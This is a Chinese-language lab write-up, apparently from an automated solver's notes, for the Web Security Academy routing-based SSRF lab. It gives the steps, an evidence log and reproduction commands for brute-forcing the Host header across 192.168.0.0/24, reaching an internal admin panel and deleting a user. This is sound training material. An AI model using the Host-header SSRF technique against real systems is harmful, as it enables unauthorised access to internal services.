---
title: "lab-host-header-routing-based-ssrf"
links:
  - target: host-header-family
    relation: evidences
---

# lab-host-header-routing-based-ssrf

> evidences: [[host-header-family]]

- 题面:Routing-based SSRF(/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)
- 实例:https://0a69000603f5958680cc359500700026.web-security-academy.net
- 判定目标:经 Host 头路由 SSRF 访问 `192.168.0.0/24` 内网 admin,删除 carlos

## 关键步

1. 侦察(`lab_page`):内网 admin 面板在 `192.168.0.0/24`;目标删 carlos。
2. 遍历 Host(新件 `header_scan`,值模板 `192.168.0.FUZZ`,`--ids 1-254`):命中 **`192.168.0.92` → 302**;其余 254 中余者皆 `504 Gateway Timeout`(前端按 Host 转发)。
3. 跟进:`GET /admin` + `Host: 192.168.0.92` → 200,内网面板,含 `POST /admin/delete`(hidden `csrf`)。
4. 收尾:`POST /admin/delete`(`csrf` + `username=carlos`,同 Host)→ 302;跟访的 `/` 返 403 属表象,删除已生效。

## 交册值

内网 admin 地址 `192.168.0.92`(前端以 Host 为上游地址路由)。

## 证据摘录

```
header_scan <inst>/ Host 192.168.0.FUZZ --ids 1-254 --quiet
 -> {"ids_probed":254,"hit_count":1,"hits":[{"value":"192.168.0.92","status":302,"bytes":41}]}
GET /admin  (Host: 192.168.0.92) -> 200,form action=/admin/delete(csrf)
POST /admin/delete  csrf=...&username=carlos  (Host: 192.168.0.92) -> 302
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf" --out /tmp/hh2-page.html
lab_launch launch <lab_id> --widget-source /web-security/host-header/exploiting/lab-host-header-routing-based-ssrf --jar /tmp/mar-jar.json
header_scan "<inst>/" Host "192.168.0.FUZZ" --ids 1-254 --quiet --jar /tmp/mar-jar.json
lab_http get "<inst>/admin" --header 'Host: 192.168.0.92' --follow --jar /tmp/mar-jar.json
lab_http post "<inst>/admin/delete" --header 'Host: 192.168.0.92' --form csrf=<csrf> --form username=carlos --follow --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

新件:`header_scan`(请求头按 FUZZ 遍历,回命中/baseline/长度簇)。题面经 `lab_page` 读取(已剥离 solution)。
